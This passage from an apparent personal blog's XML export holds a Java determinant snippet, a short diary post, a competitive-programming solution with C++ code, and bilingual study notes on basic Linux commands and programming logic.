k&lt;=n; k++)</span><br><span class="line">                    a[j][k]-=t*a[i][k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) ans*=a[i][i];</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) &#123;</span><br><span class="line">                System.out.print(a[i][j] + <span class="string">" "</span>);</span><br><span class="line">            &#125;System.out.println(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        QAQ qwq = <span class="keyword">new</span> QAQ();</span><br><span class="line">        qwq.init();</span><br><span class="line">        System.out.println(<span class="string">"ans = "</span> + qwq.Solve());</span><br><span class="line">        qwq.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> math </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitmenttest</title>
      <link href="/blog/test-gitmenttest/"/>
      <url>/blog/test-gitmenttest/</url>
      
        <content type="html"><![CDATA[<p>gitment测试一下QAQ</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190118</title>
      <link href="/blog/20190118/"/>
      <url>/blog/20190118/</url>
      
        <content type="html"><![CDATA[<p>没啥事干<br>不想玩游戏</p><p>感觉JavaScript有关对象的一些内容太过于复杂了…不学了，用到再说。</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛客练习赛32 F Friendly Polynomial</title>
      <link href="/blog/problem-NK207F/"/>
      <url>/blog/problem-NK207F/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>求 $i \in [1,n-1], a_1,a_2,…,a_i $ 构成一个 $i$ 排列的个数<br>$T$ 次询问<br>$n,T \leqslant 10^5$</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>老年人<br>体谅一下<br>没有完整的代码<br>只有 $O(n^2)$ 的做法<br><del>其实就是我不会写NTT了</del></p><p>感觉<br>这题<br>没啥难度</p><p>除了<br>NTT<br>多项式求逆</p><p>还有<br>我的脑子</p><p>阻碍了我做出这道题</p><p>留坑。<br>以后如果想起来就填好吧。</p><p>先说一下心路历程好吧。</p><p>先想暴力。<br>然后我发现了好多检查前缀是否是i排列的方法。<br>取最大值，求和 貌似都可以</p><p>然后看一下有啥性质</p><ul><li>最大的在第一个一定合法，在最后一个一定不合法</li></ul><p>一开始我考虑的是递推，从$n-1$递推到$n$，我觉得最大的影响就是最后一个数字的位置，分成两个记录，分为被之前影响的和未被影响的。<br>然后我去洗澡了233<br>然后发现有问题，其实这个题很简单就是分为两个合法和不合法就行了，之前想的未被影响的其实就是合法的<br>然后可以从前往后来做，考虑贡献，一个不合法的只能贡献一次，对于$i$位合法的才能对后面产生贡献<br>枚举第一个不合法的点，然后后面直接排列就行了。</p><p>公式</p><script type="math/tex; mode=display">\begin{align*}f[n]&=\sum_{i=1}^{n-1} ((n-i)!\times (i!-f[i]))\\&=(\sum_{i=1}^{n-1}(n-i)!\times i!)-(\sum_{i-1}^{n-1}(n-1)!\times f[i])\end{align*}</script><p>多项式</p><script type="math/tex; mode=display">f=g^2-g\times f\Rightarrow f=\frac{g^2}{1+g}</script><p>好了，双手一撒。<br>掰掰了您内！</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>$ O(n^2) $</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1005</span>;</span><br><span class="line">ll p = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line">ll f[N]; <span class="comment">// 0 - illegal / 1 legal</span></span><br><span class="line">ll pn[N];</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">pw</span><span class="params">(ll a, ll b, ll r=<span class="number">1</span>)</span> </span>&#123; <span class="keyword">for</span>(;b;b&gt;&gt;=<span class="number">1</span>,a=a*a%p) <span class="keyword">if</span>(b&amp;<span class="number">1</span>) r=r*a%p;<span class="keyword">return</span> r; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">C</span><span class="params">(ll n, ll m)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(n&lt;m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> pn[n]*pw(pn[m],p<span class="number">-2</span>)%p*pw(pn[n-m],p<span class="number">-2</span>)%p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    f[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    pn[<span class="number">0</span>]=pn[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;N;i++) pn[i]=pn[i<span class="number">-1</span>]*i%p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;N;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++) f[i]=(f[i]+(pn[j]-f[j]+p)%p*pn[i-j]%p)%p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    work();</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; f[n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem </tag>
            
            <tag> fft/ntt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux笔记</title>
      <link href="/blog/note-linux-commend/"/>
      <url>/blog/note-linux-commend/</url>
      
        <content type="html"><![CDATA[<p>I think if you want to know the options, you just need to type man/info+options or option—help is enough.</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">cd</span> </span><br><span class="line">grep</span><br><span class="line">touch</span><br><span class="line">rm </span><br><span class="line">ls</span><br><span class="line">cat </span><br><span class="line">cp</span><br><span class="line">mv</span><br><span class="line">rmdir</span><br><span class="line">df <span class="comment"># check the disk space of the hard partition</span></span><br><span class="line">du <span class="comment"># display the file directory or size</span></span><br><span class="line">fask <span class="comment"># check and repair the Linux file system</span></span><br><span class="line">bzip2/bunzip2 <span class="comment"># bunzip2 a.bz2 bzip2 a.bz2 f1 f2 f3</span></span><br><span class="line">gzip/gunzip <span class="comment"># gzip [-r] f1 f2 f2 gunzip a.gz</span></span><br><span class="line">zip/unzip <span class="comment"># same as zip</span></span><br><span class="line">tar</span><br><span class="line"><span class="comment"># create a tar file - cvf</span></span><br><span class="line"><span class="comment"># list contents os the tar file - xvf</span></span><br><span class="line"><span class="comment"># create a file that uses tar and bzip2 to archive compressed files - cjvf</span></span><br><span class="line"><span class="comment"># expand and unarchive the bZIP tar file - xjvf</span></span><br><span class="line"><span class="comment"># archive and compressed with tar and gzip - czvf</span></span><br><span class="line">ps <span class="comment"># see which programs are being executed</span></span><br><span class="line">top <span class="comment"># view execution scenario and memory usage of the current</span></span><br><span class="line"><span class="built_in">kill</span> <span class="comment"># terminate an executing process</span></span><br><span class="line">date</span><br><span class="line">chmod</span><br><span class="line">su</span><br><span class="line">useradd</span><br><span class="line">ftop</span><br><span class="line"><span class="built_in">bye</span></span><br><span class="line">ping</span><br><span class="line">telnet</span><br><span class="line">netstat</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Features-of-the-Linux-Operating-System"><a href="#Features-of-the-Linux-Operating-System" class="headerlink" title="Features of the Linux Operating System"></a>Features of the Linux Operating System</h3><ul><li>Multiuser</li><li>Multiprogramming</li><li>Time-sharing</li><li>Multitasking</li><li>Virtual memory</li><li>Shared libraries</li><li>POSIX-compliance</li><li>Samba</li><li>Network Information Service</li><li>Cron scheduler</li><li>Office suites</li><li>Data archiving utilities</li><li>Licensing</li><li>Web Server</li><li>Other features: have many free software.</li></ul><h3 id="Advantages-of-Linux"><a href="#Advantages-of-Linux" class="headerlink" title="Advantages of Linux"></a>Advantages of Linux</h3><ul><li>Open-source</li><li>Reliability</li><li>Backward compatibility</li><li>Simple upgrade and installation process</li><li>Low total cost of ownership</li><li>Support for legacy devices </li><li>GUI interface</li><li>Multiple distributors</li><li>Excellent security features</li><li>Support for high user load</li><li>Support for development libraries</li></ul><h3 id="Distributors-of-Linux"><a href="#Distributors-of-Linux" class="headerlink" title="Distributors of Linux"></a>Distributors of Linux</h3><ul><li>Red Hat</li><li>Mandriva</li><li>Debian</li><li>SUSE</li><li>Slackware</li><li>Fedora</li></ul><h3 id="Consist"><a href="#Consist" class="headerlink" title="Consist"></a>Consist</h3><p>three main components</p><ul><li>Kernel</li><li>Shell</li><li>Linux Utilities and Application Programs</li></ul><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p><code>.gnome-desktop</code>桌面</p><h2 id="Commend"><a href="#Commend" class="headerlink" title="Commend"></a>Commend</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>change the user password.<br>修改用户密码</p><p>root可以修改其他用户密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure></p><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>Show the date.<br>显示日期和时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">date &quot;+opt&quot;</span><br><span class="line">Eg</span><br><span class="line">date &quot;+%T&quot;</span><br><span class="line">13:13:13</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">date &quot;+text opt&quot;</span><br><span class="line">Eg</span><br><span class="line">date &quot;+DATE : %D&quot;</span><br><span class="line">DATE : 1/9/2019</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">%m</td><td style="text-align:center">Displays month of the year</td></tr><tr><td style="text-align:center">%d</td><td style="text-align:center">Displays day of the month</td></tr><tr><td style="text-align:center">%y</td><td style="text-align:center">Displays year</td></tr><tr><td style="text-align:center">%D</td><td style="text-align:center">Displays date as mm/dd/yy</td></tr><tr><td style="text-align:center">%H</td><td style="text-align:center">Displays hour</td></tr><tr><td style="text-align:center">%M</td><td style="text-align:center">Displays minutes</td></tr><tr><td style="text-align:center">%S</td><td style="text-align:center">Displays seconds</td></tr><tr><td style="text-align:center">%T</td><td style="text-align:center">Displays time as HH:MM:SS</td></tr><tr><td style="text-align:center">%a</td><td style="text-align:center">Displays abbreviated weekday</td></tr><tr><td style="text-align:center">%h</td><td style="text-align:center">Displays abbreviated month</td></tr><tr><td style="text-align:center">%r</td><td style="text-align:center">Displays time in the AM/PM notation</td></tr></tbody></table></div><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><p>Clear Screen.<br>清屏</p><h3 id="tput-Pending"><a href="#tput-Pending" class="headerlink" title="tput - Pending"></a>tput - Pending</h3><p>tput 完成交互，专业性强的屏幕输出</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">tput clear</td><td style="text-align:center">clear screen</td></tr><tr><td style="text-align:center">tput sc</td><td style="text-align:center">save the position of cursor</td></tr><tr><td style="text-align:center">tput cup</td><td style="text-align:center">change the position of cursor</td></tr><tr><td style="text-align:center">tput civis</td><td style="text-align:center">Hide the cursor</td></tr><tr><td style="text-align:center">tput cnorm</td><td style="text-align:center">Show the cursor</td></tr><tr><td style="text-align:center">tput rc</td><td style="text-align:center">show the output</td></tr><tr><td style="text-align:center">tput smso</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">tput rmso</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">tput blink</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">tput reset</td></tr></tbody></table></div><h3 id="who"><a href="#who" class="headerlink" title="who"></a>who</h3><p>显示当前登录的用户<br>第一列：登录名<br>第二列：终端类型和终端号<br>第三列：登录时间<br>第四列：The remote host name of the terminal from where the user has logged in. Note that this is shown only for users who have not logged in from the server.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">-m</td><td style="text-align:center">当前登录用户名，等价于<code>who am i</code></td></tr><tr><td style="text-align:center">-q</td><td style="text-align:center">只显示登录名和登录数</td></tr></tbody></table></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who am i</span><br></pre></td></tr></table></figure><h3 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h3><p>显示系统持续时间</p><p>分别是：当前时间，系统运行时间，登录用户数，平均CPU使用率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uptime</span><br></pre></td></tr></table></figure><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man +程序名</span><br></pre></td></tr></table></figure><h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><p>info比man要详细一些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info [options] [menu item]</span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">—apropos=string</td><td style="text-align:center">Search string</td></tr><tr><td style="text-align:center">-o,—output=FILENAME</td><td style="text-align:center">output the information</td></tr><tr><td style="text-align:center">-h,-help</td><td style="text-align:center">help</td></tr><tr><td style="text-align:center">—version</td><td style="text-align:center">version</td></tr></tbody></table></div><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><p>change the current directory<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ../ 切换到上一层目录</span><br><span class="line"></span><br><span class="line">cd / 切换到系统根目录</span><br><span class="line"></span><br><span class="line">cd ~ 切换到用户主目录</span><br><span class="line"></span><br><span class="line">cd - 切换到上一个所在目录（返回）</span><br></pre></td></tr></table></figure></p><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>显示目录下的文件和子文件夹<br><code>ls -l</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">Column</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">文件类型和权限</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Number of link</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">文件所有者</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">组所有者</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">文件大小</td></tr><tr><td style="text-align:center">6,7,8</td><td style="text-align:center">最后修改时间</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">文件名</td></tr></tbody></table></div><p>文件类型</p><div class="table-container"><table><thead><tr><th style="text-align:center">Symbol</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">-</td><td style="text-align:center">普通文件</td></tr><tr><td style="text-align:center">d</td><td style="text-align:center">文件夹</td></tr><tr><td style="text-align:center">b</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">c</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">l</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">s</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">p</td></tr></tbody></table></div><p>| Option | Description |<br>| -a | 显示所有文件 |<br>| -F | |<br>| -R | |<br>| -r | |<br>| -S | |<br>| -A | |</p><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>显示当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><h3 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h3><p>删除文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir +文件夹名</span><br></pre></td></tr></table></figure></p><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><h3 id="0-lt-1-gt-1-gt-gt-2-gt"><a href="#0-lt-1-gt-1-gt-gt-2-gt" class="headerlink" title="0&lt;,1&gt;,1&gt;&gt;,2&gt;"></a><code>0&lt;,1&gt;,1&gt;&gt;,2&gt;</code></h3><p>文件重定向</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>0&lt;,&lt;</code></td><td style="text-align:center">读入</td></tr><tr><td style="text-align:center"><code>&gt;,1&gt;</code></td><td style="text-align:center">输出到文件，重新写</td></tr><tr><td style="text-align:center"><code>&gt;&gt;,1&gt;&gt;</code></td><td style="text-align:center">续写文件</td></tr><tr><td style="text-align:center"><code>2&gt;</code></td><td style="text-align:center">输出错误提示信息到文件</td></tr></tbody></table></div><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p><code>- --- --- ---</code><br><code>dir|document owner group otheruser</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">Symbol</th><th style="text-align:center">Meaning</th><th style="text-align:center">Number</th></tr></thead><tbody><tr><td style="text-align:center">r</td><td style="text-align:center">read</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">w</td><td style="text-align:center">write</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">x</td><td style="text-align:center">execute</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">-</td><td style="text-align:center">no</td><td style="text-align:center">0</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">Symbol</th><th style="text-align:center">Meaning</th></tr></thead><tbody><tr><td style="text-align:center">u</td><td style="text-align:center">owner</td></tr><tr><td style="text-align:center">g</td><td style="text-align:center">group</td></tr><tr><td style="text-align:center">o</td><td style="text-align:center">otheruser</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">alluser</td></tr></tbody></table></div><p><code>chmod u|g|o|a +|- r|w|x file_name</code><br><code>chmod 777 file_name</code></p><h2 id="filters"><a href="#filters" class="headerlink" title="filters"></a>filters</h2><p>使用多个过滤器时用<code>|</code>分隔开，在最前面写文件名</p><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [option(s)] pattern [filename]</span><br></pre></td></tr></table></figure><p>以行为单位筛选包含指定字符的行</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">-n</td><td style="text-align:center">显示行号</td></tr><tr><td style="text-align:center">-c</td><td style="text-align:center">输出匹配到行的个数</td></tr><tr><td style="text-align:center">-v</td><td style="text-align:center">反向查找，查找不匹配的行</td></tr></tbody></table></div><h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc [option(s)] [filename]</span><br></pre></td></tr></table></figure><p>计数工具</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">-l</td><td style="text-align:center">显示行数量</td></tr><tr><td style="text-align:center">-w</td><td style="text-align:center">显示单词数</td></tr><tr><td style="text-align:center">-c</td><td style="text-align:center">显示字符数</td></tr></tbody></table></div><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut [option(s)] [filename]</span><br></pre></td></tr></table></figure><p>显示一列、一列字符</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">-f<column_number(s)></column_number(s)></td><td style="text-align:center">显示的列数，用逗号分隔，可用-连接</td></tr><tr><td style="text-align:center">-c<character_number(s)></character_number(s)></td><td style="text-align:center">显示每列字符的位数</td></tr><tr><td style="text-align:center">-d&lt;column_delimiter</td><td style="text-align:center">列分隔符</td></tr></tbody></table></div><h3 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h3><p>tr字符可以对来自标准输入的字符进行替换、压缩和删除，可以将一组字符编程另外一组字符。</p><p>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr &quot;[a-z]&quot; &quot;[A-Z]&quot;</span><br></pre></td></tr></table></figure></p><p>转换小写为大写<br>需要文件重定向来写入</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>-c, -C, --complement</code></td><td style="text-align:center">取代所有不属于第一字符集的字符</td></tr><tr><td style="text-align:center"><code>-d, --delete</code></td><td style="text-align:center">删除所有属于第一字符集的字符</td></tr><tr><td style="text-align:center"><code>-s, --squeeze-repeats</code></td><td style="text-align:center">把连续重复的字符以单独一个字符表示</td></tr><tr><td style="text-align:center"><code>-t, --truncate-set1</code></td><td style="text-align:center">先删除第一字符集较第二字符集多出的字符</td></tr></tbody></table></div><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>排序</p><p>ascending(asc)正序<br>descending(desc)倒序</p><div class="table-container"><table><thead><tr><th style="text-align:center">Option</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">-b</td><td style="text-align:center">忽略每行前面开始出的空格字符</td></tr><tr><td style="text-align:center">-c</td><td style="text-align:center">检查文件是否已经按照顺序排序</td></tr><tr><td style="text-align:center">-d</td><td style="text-align:center">排序时，处理英文字母、数字及空格字符外，忽略其他的字符</td></tr><tr><td style="text-align:center">-f</td><td style="text-align:center">排序时，将小写字母视为大写字母</td></tr><tr><td style="text-align:center">-i</td><td style="text-align:center">排序时，除了040至176之间的ASCII字符外，忽略其他的字符</td></tr><tr><td style="text-align:center">-m</td><td style="text-align:center">将几个排序好的文件进行合并</td></tr><tr><td style="text-align:center">-M</td><td style="text-align:center">将前面3个字母依照月份的缩写进行排序</td></tr><tr><td style="text-align:center">-n</td><td style="text-align:center">依照数值的大小排序</td></tr><tr><td style="text-align:center">-o<output_filename></output_filename></td><td style="text-align:center">将排序后的结果存入指定的文件</td></tr><tr><td style="text-align:center">-r</td><td style="text-align:center">以相反的顺序来排序</td></tr><tr><td style="text-align:center">-t&lt;分隔字符&gt;</td><td style="text-align:center">指定排序时所用的栏位分隔字符</td></tr><tr><td style="text-align:center">+&lt;起始栏位&gt;-&lt;结束栏位&gt;</td><td style="text-align:center">以指定的栏位来排序，范围左闭右开</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PLT笔记</title>
      <link href="/blog/note-PLT/"/>
      <url>/blog/note-PLT/</url>
      
        <content type="html"><![CDATA[<p>Phases - 阶段<br>Input-Process-Output cycle</p><p>A set of instructions to perform a particular job is called a program.</p><p>An algorithm is a sequence of steps required to solve a problem.</p><p>A flowchart is a graphical representation of the steps to be followed for solving a problem.It consists of a set of symbols, each symbol represents a specific activity.</p><p>平行四边形 - Input - 输入<br>长方形 - Process - 过程<br>左尖右弧 - Output - 输出<br>菱形 - Decision - 决策<br>长方形+两个竖线 - Procedure/Subtoutine - 子程序<br>箭头 - Flow lines - 流程线<br>椭圆 - Terminator - 结束符<br>圆 - On-page connector - 同页连接器<br>长方形+倒三角 - Off-page connector - 分页连接器<br>右不封口长方形+竖线 - Annotation - 注释</p><p>Variable<br>type:Numeric Character<br>Numeric variables can contain only numbers.<br>Character variables can contain any combination of letters, numbers, and special characters.<br>Variable Naming Conventions:first letter of variable may indicate data type used; first letter of each words could be capitalized; not contain embedded space and <code>?!@#$%^&amp;*(){}[].,:;&quot;&#39;/\</code></p><p>Operators: Arithmetic operators, Relational operators, Logical operators.<br>Arithmetic operators are used to perform arithmetic calculations.<br>Relational operators are used to test the relationship between two variables or the relationship between a variable and a constant.<br>Logical operators are used to combine expressions containing relational operators.<br>Precedence of the execution of logical operators is NOT, AND and 